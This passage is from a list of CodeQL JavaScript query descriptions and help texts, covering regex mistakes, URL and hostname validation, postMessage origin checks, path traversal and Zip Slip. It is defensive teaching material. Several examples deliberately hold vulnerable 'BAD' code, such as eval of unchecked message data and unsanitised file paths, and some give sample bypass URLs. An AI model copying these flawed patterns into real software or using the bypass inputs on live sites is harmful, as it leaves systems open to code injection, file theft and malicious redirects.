    \ could be interpreted differently on different platforms.\n\n\n```javascript\n\
    if (!/[[{]\\w+[]}]/.test(input))\n\tconsole.log(\"Malformed input.\");\n```\n\
    To fix this problem, the regular expression should be rewritten to `/[[{]\\w+[\\\
    ]}]/`.\n\n\n## References\n* Mozilla Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: RegExp/IdentityReplacement.ql
  relativeBqrsPath: codeql/javascript-queries/RegExp/IdentityReplacement.bqrs
  metadata:
    name: Replacement of a substring with itself
    description: Replacing a substring with itself has no effect and may indicate
      a mistake.
    kind: problem
    problem.severity: warning
    security-severity: 5.0
    id: js/identity-replacement
    precision: very-high
    tags: |-
      correctness
             security
             external/cwe/cwe-116
  queryHelp: |
    # Replacement of a substring with itself
    Replacing a substring with itself has no effect and usually indicates a mistake, such as misspelling a backslash escape.


    ## Recommendation
    Examine the string replacement to find and correct any typos.


    ## Example
    The following code snippet attempts to backslash-escape all double quotes in `raw` by replacing all instances of `"` with `\"`:


    ```javascript
    var escaped = raw.replace(/"/g, '\"');

    ```
    However, the replacement string `'\"'` is actually the same as `'"'`, with `\"` interpreted as an identity escape, so the replacement does nothing. Instead, the replacement string should be `'\\"'`:


    ```javascript
    var escaped = raw.replace(/"/g, '\\"');

    ```

    ## References
    * Mozilla Developer Network: [String escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Escape_notation).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: RegExp/RegExpAlwaysMatches.ql
  relativeBqrsPath: codeql/javascript-queries/RegExp/RegExpAlwaysMatches.bqrs
  metadata:
    name: Regular expression always matches
    description: Regular expression tests that always find a match indicate dead code
      or a logic error
    kind: problem
    problem.severity: warning
    id: js/regex/always-matches
    tags: |-
      quality
             reliability
             correctness
             regular-expressions
    precision: high
  queryHelp: |
    # Regular expression always matches
    There are several built-in JavaScript functions that search for a regular expression match within a string, such as `RegExp.prototype.test` and `String.prototype.search`. If the regular expression is not anchored, it only needs to match a substring of the input and won't necessarily match the whole string.

    If the regular expression being searched for accepts the empty string, this means it can match an empty substring anywhere in the input string, and will thus always find a match. In this case, testing if a match exists is redundant and indicates dead code.


    ## Recommendation
    Examine the regular expression and determine how it was intended to match:

    * To match the whole input string, add anchors at the beginning and end of the regular expression.
    * To search for an occurrence within the input string, consider what the shortest meaningful match is and restrict the regular expression accordingly, such as by changing a `*` to a `+`.

    ## Example
    In the following example, a regular expression is used to check the format of a string `id`. However, the check always passes because the regular expression can match the empty substring. For example, it will allow the ID string "`%%`" by matching an empty string at index 0.


    ```javascript
    if (!/[a-z0-9]*/.test(id)) {
        throw new Error("Invalid id: " + id);
    }

    ```
    To ensure the regular expression matches the whole string, add anchors at the beginning and end:


    ```javascript
    if (!/^[a-z0-9]*$/.test(id)) {
        throw new Error("Invalid id: " + id);
    }

    ```

    ## References
    * Mozilla Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: RegExp/UnboundBackref.ql
  relativeBqrsPath: codeql/javascript-queries/RegExp/UnboundBackref.bqrs
  metadata:
    name: Unbound back reference
    description: |-
      Regular expression escape sequences of the form '\n', where 'n' is a positive number
                    greater than the number of capture groups in the regular expression, are not allowed
                    by the ECMAScript standard.
    kind: problem
    problem.severity: warning
    id: js/regex/unbound-back-reference
    tags: |-
      quality
             reliability
             correctness
             regular-expressions
    precision: very-high
  queryHelp: |
    # Unbound back reference
    In regular expressions, back references can be used to refer back to the result of a previously matched capture group. The ECMAScript standard forbids back references of the form '\\n', where 'n' is a positive number greater than the number of capture groups in the regular expression.

    While many browsers allow such references and interpret them as normal character escapes instead, this behavior is non-standard and should not be relied on. It can also be a source of bugs if the regular expression is changed later on, since the character escape may then start matching newly introduced capture groups.


    ## Recommendation
    If the back reference is meant to refer to a capture group, ensure that there is a capture group with the right number. If it is meant to be an escape sequence, convert it to a hexadecimal character escape, which is ECMAScript-compliant.


    ## Example
    In the following example, the back reference `\1` presumably is meant to refer to the string matched by the group `(?:\s+)`. However, that group is non-capturing.


    ```javascript
    /^(?:\s+)\w+\1$/;

    ```
    To fix this, convert the group into a capturing group `(\s+)`.

    If `\1` is actually meant to match the character with character code 1, it should be rewritten into the hexadecimal character escape `\x01`.


    ## References
    * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 15. ECMA, 2011.
    * Mozilla Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: RegExp/UnmatchableCaret.ql
  relativeBqrsPath: codeql/javascript-queries/RegExp/UnmatchableCaret.bqrs
  metadata:
    name: Unmatchable caret in regular expression
    description: |-
      If a caret assertion '^' appears in a regular expression after another term that
                    cannot match the empty string, then this assertion can never match, so the entire
                    regular expression cannot match any string.
    kind: problem
    problem.severity: error
    id: js/regex/unmatchable-caret
    tags: |-
      quality
             reliability
             correctness
             regular-expressions
             external/cwe/cwe-561
    precision: very-high
  queryHelp: "# Unmatchable caret in regular expression\nThe caret character `^` in\
    \ a regular expression only matches at the beginning of the input, or (for multi-line\
    \ regular expressions) at the beginning of a line. If it is preceded by a pattern\
    \ that must match a non-empty sequence of (non-newline) input characters, it cannot\
    \ possibly match, rendering the entire regular expression unmatchable.\n\n\n##\
    \ Recommendation\nExamine the regular expression to find and correct any typos.\n\
    \n\n## Example\nIn the following example, the regular expression `/\\[^.]*\\.css/`\
    \ cannot match any string, since it contains a caret assertion preceded by an\
    \ escape sequence that matches an opening bracket.\n\n\n```javascript\nif (file.match(/\\\
    [^.]*\\.css/))\n\tconsole.log(\"Found it.\");\n```\n\n## References\n* Mozilla\
    \ Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n\
    * Common Weakness Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: RegExp/UnmatchableDollar.ql
  relativeBqrsPath: codeql/javascript-queries/RegExp/UnmatchableDollar.bqrs
  metadata:
    name: Unmatchable dollar in regular expression
    description: |-
      If a dollar assertion '$' appears in a regular expression before another term that
                    cannot match the empty string, then this assertion can never match, so the entire
                    regular expression cannot match any string.
    kind: problem
    problem.severity: error
    id: js/regex/unmatchable-dollar
    tags: |-
      quality
             reliability
             correctness
             regular-expressions
             external/cwe/cwe-561
    precision: very-high
  queryHelp: "# Unmatchable dollar in regular expression\nThe dollar character `$`\
    \ in a regular expression only matches at the end of the input, or (for multi-line\
    \ regular expressions) at the end of a line. If it is followed by a pattern that\
    \ must match a non-empty sequence of (non-newline) input characters, it cannot\
    \ possibly match, rendering the entire regular expression unmatchable.\n\n\n##\
    \ Recommendation\nExamine the regular expression to find and correct any typos.\n\
    \n\n## Example\nIn the following example, the regular expression `/\\.\\(\\w+$\\\
    )/` cannot match any string, since it contains a dollar assertion followed by\
    \ an escape sequence that matches a closing parenthesis.\n\n\n```javascript\n\
    if (file.match(/\\.\\(\\w+$\\)/))\n\tconsole.log(\"Found it.\");\n```\n\n## References\n\
    * Mozilla Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n\
    * Common Weakness Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/IncompleteHostnameRegExp.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncompleteHostnameRegExp.bqrs
  metadata:
    name: Incomplete regular expression for hostnames
    description: Matching a URL or hostname against a regular expression that contains
      an unescaped dot as part of the hostname might match more hostnames than expected.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/incomplete-hostname-regexp
    tags: |-
      correctness
             security
             external/cwe/cwe-020
  queryHelp: |
    # Incomplete regular expression for hostnames
    Sanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Often, this is done by checking that the host of a URL is in a set of allowed hosts.

    If a regular expression implements such a check, it is easy to accidentally make the check too permissive by not escaping the `.` meta-characters appropriately. Even if the check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when it accidentally succeeds.


    ## Recommendation
    Escape all meta-characters appropriately when constructing regular expressions for security checks, and pay special attention to the `.` meta-character.


    ## Example
    The following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains.


    ```javascript
    app.get('/some/path', function(req, res) {
        let url = req.param('url'),
            host = urlLib.parse(url).host;
        // BAD: the host of `url` may be controlled by an attacker
        let regex = /^((www|beta).)?example.com/;
        if (host.match(regex)) {
            res.redirect(url);
        }
    });

    ```
    The check is however easy to bypass because the unescaped `.` allows for any character before `example.com`, effectively allowing the redirect to go to an attacker-controlled domain such as `wwwXexample.com`.

    Address this vulnerability by escaping `.` appropriately: `let regex = /^((www|beta)\.)?example\.com/`.


    ## References
    * MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)
    * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
    * OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/IncompleteUrlSchemeCheck.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncompleteUrlSchemeCheck.bqrs
  metadata:
    name: Incomplete URL scheme check
    description: |-
      Checking for the "javascript:" URL scheme without also checking for "vbscript:"
                    and "data:" suggests a logic error or even a security vulnerability.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/incomplete-url-scheme-check
    tags: |-
      security
             correctness
             external/cwe/cwe-020
             external/cwe/cwe-184
  queryHelp: |
    # Incomplete URL scheme check
    URLs starting with `javascript:` can be used to encode JavaScript code to be executed when the URL is visited. While this is a powerful mechanism for creating feature-rich and responsive web applications, it is also a potential security risk: if the URL comes from an untrusted source, it might contain harmful JavaScript code. For this reason, many frameworks and libraries first check the URL scheme of any untrusted URL, and reject URLs with the `javascript:` scheme.

    However, the `data:` and `vbscript:` schemes can be used to represent executable code in a very similar way, so any validation logic that checks against `javascript:`, but not against `data:` and `vbscript:`, is likely to be insufficient.


    ## Recommendation
    Add checks covering both `data:` and `vbscript:`.


    ## Example
    The following function validates a (presumably untrusted) URL `url`. If it starts with `javascript:` (case-insensitive and potentially preceded by whitespace), the harmless placeholder URL `about:blank` is returned to prevent code injection; otherwise `url` itself is returned.


    ```javascript
    function sanitizeUrl(url) {
        let u = decodeURI(url).trim().toLowerCase();
        if (u.startsWith("javascript:"))
            return "about:blank";
        return url;
    }

    ```
    While this check provides partial projection, it should be extended to cover `data:` and `vbscript:` as well:


    ```javascript
    function sanitizeUrl(url) {
        let u = decodeURI(url).trim().toLowerCase();
        if (u.startsWith("javascript:") || u.startsWith("data:") || u.startsWith("vbscript:"))
            return "about:blank";
        return url;
    }

    ```

    ## References
    * WHATWG: [URL schemes](https://wiki.whatwg.org/wiki/URL_schemes).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
    * Common Weakness Enumeration: [CWE-184](https://cwe.mitre.org/data/definitions/184.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/IncompleteUrlSubstringSanitization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncompleteUrlSubstringSanitization.bqrs
  metadata:
    name: Incomplete URL substring sanitization
    description: Security checks on the substrings of an unparsed URL are often vulnerable
      to bypassing.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/incomplete-url-substring-sanitization
    tags: |-
      correctness
             security
             external/cwe/cwe-020
  queryHelp: |
    # Incomplete URL substring sanitization
    Sanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.

    However, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.

    Even if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.


    ## Recommendation
    Parse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.


    ## Example
    The following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.


    ```javascript
    app.get('/some/path', function(req, res) {
        let url = req.param("url");
        // BAD: the host of `url` may be controlled by an attacker
        if (url.includes("example.com")) {
            res.redirect(url);
        }
    });

    ```
    The substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:


    ```javascript
    app.get('/some/path', function(req, res) {
        let url = req.param("url"),
            host = urlLib.parse(url).host;
        // BAD: the host of `url` may be controlled by an attacker
        if (host.includes("example.com")) {
            res.redirect(url);
        }
    });

    ```
    This is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:


    ```javascript
    app.get('/some/path', function(req, res) {
        let url = req.param('url'),
            host = urlLib.parse(url).host;
        // GOOD: the host of `url` can not be controlled by an attacker
        let allowedHosts = [
            'example.com',
            'beta.example.com',
            'www.example.com'
        ];
        if (allowedHosts.includes(host)) {
            res.redirect(url);
        }
    });

    ```

    ## References
    * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
    * OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/IncorrectSuffixCheck.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncorrectSuffixCheck.bqrs
  metadata:
    name: Incorrect suffix check
    description: Using indexOf to implement endsWith functionality is error-prone
      if the -1 case is not explicitly handled.
    kind: problem
    problem.severity: error
    security-severity: 7.8
    precision: high
    id: js/incorrect-suffix-check
    tags: |-
      security
             correctness
             external/cwe/cwe-020
  queryHelp: |
    # Incorrect suffix check
    The `indexOf` and `lastIndexOf` methods are sometimes used to check if a substring occurs at a certain position in a string. However, if the returned index is compared to an expression that might evaluate to -1, the check may pass in some cases where the substring was not found at all.

    Specifically, this can easily happen when implementing `endsWith` using `indexOf`.


    ## Recommendation
    Use `String.prototype.endsWith` if it is available. Otherwise, explicitly handle the -1 case, either by checking the relative lengths of the strings, or by checking if the returned index is -1.


    ## Example
    The following example uses `lastIndexOf` to determine if the string `x` ends with the string `y`:


    ```javascript
    function endsWith(x, y) {
      return x.lastIndexOf(y) === x.length - y.length;
    }

    ```
    However, if `y` is one character longer than `x`, the right-hand side `x.length - y.length` becomes -1, which then equals the return value of `lastIndexOf`. This will make the test pass, even though `x` does not end with `y`.

    To avoid this, explicitly check for the -1 case:


    ```javascript
    function endsWith(x, y) {
      let index = x.lastIndexOf(y);
      return index !== -1 && index === x.length - y.length;
    }

    ```

    ## References
    * MDN: [String.prototype.endsWith](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/endsWith)
    * MDN: [String.prototype.indexOf](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/indexOf)
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/MissingOriginCheck.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/MissingOriginCheck.bqrs
  metadata:
    name: Missing origin verification in `postMessage` handler
    description: Missing origin verification in a `postMessage` handler allows any
      windows to send arbitrary data to the handler.
    kind: problem
    problem.severity: warning
    security-severity: 5
    precision: medium
    id: js/missing-origin-check
    tags: |-
      correctness
             security
             external/cwe/cwe-020
             external/cwe/cwe-940
  queryHelp: |
    # Missing origin verification in `postMessage` handler
    The `"message"` event is used to send messages between windows. An untrusted window can send a message to a trusted window, and it is up to the receiver to verify the legitimacy of the message. One way of performing that verification is to check the `origin` of the message ensure that it originates from a trusted window.


    ## Recommendation
    Always verify the origin of incoming messages.


    ## Example
    The example below uses a received message to execute some code. However, the origin of the message is not checked, so it might be possible for an attacker to execute arbitrary code.


    ```javascript
    function postMessageHandler(event) {
        let origin = event.origin.toLowerCase();

        console.log(origin)
        // BAD: the origin property is not checked
        eval(event.data);
    }

    window.addEventListener('message', postMessageHandler, false);

    ```
    The example is fixed below, where the origin is checked to be trusted. It is therefore not possible for a malicious user to perform an attack using an untrusted origin.


    ```javascript
    function postMessageHandler(event) {
        console.log(event.origin)
        // GOOD: the origin property is checked
        if (event.origin === 'https://www.example.com') {
            // do something
        }
    }

    window.addEventListener('message', postMessageHandler, false);
    ```

    ## References
    * [Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).
    * [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation).
    * [The pitfalls of postMessage](https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
    * Common Weakness Enumeration: [CWE-940](https://cwe.mitre.org/data/definitions/940.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/MissingRegExpAnchor.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/MissingRegExpAnchor.bqrs
  metadata:
    name: Missing regular expression anchor
    description: Regular expressions without anchors can be vulnerable to bypassing.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: medium
    id: js/regex/missing-regexp-anchor
    tags: |-
      correctness
             security
             external/cwe/cwe-020
  queryHelp: |
    # Missing regular expression anchor
    Sanitizing untrusted input with regular expressions is a common technique. However, it is error-prone to match untrusted input against regular expressions without anchors such as `^` or `$`. Malicious input can bypass such security checks by embedding one of the allowed patterns in an unexpected location.

    Even if the matching is not done in a security-critical context, it may still cause undesirable behavior when the regular expression accidentally matches.


    ## Recommendation
    Use anchors to ensure that regular expressions match at the expected locations.


    ## Example
    The following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.


    ```javascript
    app.get("/some/path", function(req, res) {
        let url = req.param("url");
        // BAD: the host of `url` may be controlled by an attacker
        if (url.match(/https?:\/\/www\.example\.com\//)) {
            res.redirect(url);
        }
    });

    ```
    The check with the regular expression match is, however, easy to bypass. For example by embedding `http://example.com/` in the query string component: `http://evil-example.net/?x=http://example.com/`. Address these shortcomings by using anchors in the regular expression instead:


    ```javascript
    app.get("/some/path", function(req, res) {
        let url = req.param("url");
        // GOOD: the host of `url` can not be controlled by an attacker
        if (url.match(/^https?:\/\/www\.example\.com\//)) {
            res.redirect(url);
        }
    });

    ```
    A related mistake is to write a regular expression with multiple alternatives, but to only include an anchor for one of the alternatives. As an example, the regular expression `/^www\.example\.com|beta\.example\.com/` will match the host `evil.beta.example.com` because the regular expression is parsed as `/(^www\.example\.com)|(beta\.example\.com)/`


    ## References
    * MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)
    * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
    * OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/OverlyLargeRange.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/OverlyLargeRange.bqrs
  metadata:
    name: Overly permissive regular expression range
    description: |-
      Overly permissive regular expression ranges match a wider range of characters than intended.
                    This may allow an attacker to bypass a filter or sanitizer.
    kind: problem
    problem.severity: warning
    security-severity: 5.0
    precision: high
    id: js/overly-large-range
    tags: |-
      correctness
             security
             external/cwe/cwe-020
  queryHelp: |
    # Overly permissive regular expression range
    It's easy to write a regular expression range that matches a wider range of characters than you intended. For example, `/[a-zA-z]/` matches all lowercase and all uppercase letters, as you would expect, but it also matches the characters: `` [ \ ] ^ _ ` ``.

    Another common problem is failing to escape the dash character in a regular expression. An unescaped dash is interpreted as part of a range. For example, in the character class `[a-zA-Z0-9%=.,-_]` the last character range matches the 55 characters between `,` and `_` (both included), which overlaps with the range `[0-9]` and is clearly not intended by the writer.


    ## Recommendation
    Avoid any confusion about which characters are included in the range by writing unambiguous regular expressions. Always check that character ranges match only the expected characters.


    ## Example
    The following example code is intended to check whether a string is a valid 6 digit hex color.

    ```javascript

    function isValidHexColor(color) {
        return /^#[0-9a-fA-f]{6}$/i.test(color);
    }

    ```
    However, the `A-f` range is overly large and matches every uppercase character. It would parse a "color" like `#XXYYZZ` as valid.

    The fix is to use an uppercase `A-F` range instead.

    ```javascript

    function isValidHexColor(color) {
        return /^#[0-9A-F]{6}$/i.test(color);
    }

    ```

    ## References
    * GitHub Advisory Database: [CVE-2021-42740: Improper Neutralization of Special Elements used in a Command in Shell-quote](https://github.com/advisories/GHSA-g4rg-993r-mgx7)
    * wh0.github.io: [Exploiting CVE-2021-42740](https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html)
    * Yosuke Ota: [no-obscure-range](https://ota-meshi.github.io/eslint-plugin-regexp/rules/no-obscure-range.html)
    * Paul Boyd: [The regex \[,-.\]](https://pboyd.io/posts/comma-dash-dot/)
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/UselessRegExpCharacterEscape.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/UselessRegExpCharacterEscape.bqrs
  metadata:
    name: Useless regular-expression character escape
    description: |-
      Prepending a backslash to an ordinary character in a string
                    does not have any effect, and may make regular expressions constructed from this string
                    behave unexpectedly.
    kind: problem
    problem.severity: error
    security-severity: 7.8
    precision: high
    id: js/useless-regexp-character-escape
    tags: |-
      correctness
             security
             external/cwe/cwe-020
  queryHelp: |
    # Useless regular-expression character escape
    When a character in a string literal or regular expression literal is preceded by a backslash, it is interpreted as part of an escape sequence. For example, the escape sequence `\n` in a string literal corresponds to a single `newline` character, and not the `\` and `n` characters. However, not all characters change meaning when used in an escape sequence. In this case, the backslash just makes the character appear to mean something else, and the backslash actually has no effect. For example, the escape sequence `\k` in a string literal just means `k`. Such superfluous escape sequences are usually benign, and do not change the behavior of the program.

    The set of characters that change meaning when in escape sequences is different for regular expression literals and string literals. This can be problematic when a regular expression literal is turned into a regular expression that is built from one or more string literals. The problem occurs when a regular expression escape sequence loses its special meaning in a string literal.


    ## Recommendation
    Ensure that the right amount of backslashes is used when escaping characters in strings, template literals and regular expressions. Pay special attention to the number of backslashes when rewriting a regular expression as a string literal.


    ## Example
    The following example code checks that a string is `"my-marker"`, possibly surrounded by white space:


    ```javascript
    let regex = new RegExp('(^\s*)my-marker(\s*$)'),
        isMyMarkerText = regex.test(text);

    ```
    However, the check does not work properly for white space as the two `\s` occurrences are semantically equivalent to just `s`, meaning that the check will succeed for strings like `"smy-markers"` instead of `" my-marker "`. Address these shortcomings by either using a regular expression literal (`/(^\s*)my-marker(\s*$)/`), or by adding extra backslashes (`'(^\\s*)my-marker(\\s*$)'`).


    ## References
    * MDN: [Regular expression escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#Escaping)
    * MDN: [String escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Escape_notation)
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-022/TaintedPath.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-022/TaintedPath.bqrs
  metadata:
    name: Uncontrolled data used in path expression
    description: |-
      Accessing paths influenced by users can allow an attacker to access
                    unexpected resources.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/path-injection
    tags: |-
      security
             external/cwe/cwe-022
             external/cwe/cwe-023
             external/cwe/cwe-036
             external/cwe/cwe-073
             external/cwe/cwe-099
  queryHelp: |
    # Uncontrolled data used in path expression
    Accessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.


    ## Recommendation
    Validate user input before using it to construct a file path.

    The validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.

    In the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any ".." segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.

    In the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove "../" sequences: for example, applying this filter to ".../...//" would still result in the string "../".

    Finally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.


    ## Example
    In the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing "../" segments to navigate outside the root folder and access sensitive files.


    ```javascript
    const fs = require('fs'),
          http = require('http'),
          url = require('url');

    const ROOT = "/var/www/";

    var server = http.createServer(function(req, res) {
      let filePath = url.parse(req.url, true).query.path;

      // BAD: This function uses unsanitized input that can read any file on the file system.
      res.write(fs.readFileSync(ROOT + filePath, 'utf8'));
    });
    ```
    The second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any "../" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.


    ```javascript
    const fs = require('fs'),
          http = require('http'),
          path = require('path'),
          url = require('url');

    const ROOT = "/var/www/";

    var server = http.createServer(function(req, res) {
      let filePath = url.parse(req.url, true).query.path;

      // GOOD: Verify that the file path is under the root directory
      filePath = fs.realpathSync(path.resolve(ROOT, filePath));
      if (!filePath.startsWith(ROOT)) {
        res.statusCode = 403;
        res.end();
        return;
      }
      res.write(fs.readFileSync(filePath, 'utf8'));
    });
    ```

    ## References
    * OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).
    * npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.
    * Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).
    * Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).
    * Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).
    * Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).
    * Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-022/ZipSlip.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-022/ZipSlip.bqrs
  metadata:
    name: Arbitrary file access during archive extraction ("Zip Slip")
    description: |-
      Extracting files from a malicious ZIP file, or similar type of archive, without
                    validating that the destination file path is within the destination directory
                    can allow an attacker to unexpectedly gain access to resources.
    kind: path-problem
    id: js/zipslip
    problem.severity: error
    security-severity: 7.5
    precision: high
    tags: |-
      security
             external/cwe/cwe-022
  queryHelp: |
    # Arbitrary file access during archive extraction ("Zip Slip")
    Extracting files from a malicious zip file, or similar type of archive, is at risk of directory traversal attacks if filenames from the archive are not properly validated. archive paths.

    Zip archives contain archive entries representing each file in the archive. These entries include a file path for the entry, but these file paths are not restricted and may contain unexpected special elements such as the directory traversal element (`..`). If these file paths are used to create a filesystem path, then a file operation may happen in an unexpected location. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.

    For example, if a zip file contains a file entry `..\sneaky-file`, and the zip file is extracted to the directory `c:\output`, then naively combining the paths would result in an output file path of `c:\output\..\sneaky-file`, which would cause the file to be written to `c:\sneaky-file`.


    ## Recommendation
    Ensure that output paths constructed from zip archive entries are validated to prevent writing files to unexpected locations.

    The recommended way of writing an output file from a zip archive entry is to check that `".."` does not occur in the path.


    ## Example
    In this example an archive is extracted without validating file paths. If `archive.zip` contained relative paths (for instance, if it were created by something like `zip archive.zip ../file.txt`) then executing this code could write to locations outside the destination directory.


    ```javascript
    const fs = require('fs');
    const unzip = require('unzip');

    fs.createReadStream('archive.zip')
      .pipe(unzip.Parse())
      .on('entry', entry => {
        const fileName = entry.path;
        // BAD: This could write any file on the filesystem.
        entry.pipe(fs.createWriteStream(fileName));
      });

    ```
    To fix this vulnerability, we need to check that the path does not contain any `".."` elements in it.


    ```javascript
    const fs = require('fs');
    const unzip = require('unzip');

    fs.createReadStream('archive.zip')
      .pipe(unzip.Parse())
      .on('entry', entry => {
        const fileName = entry.path;
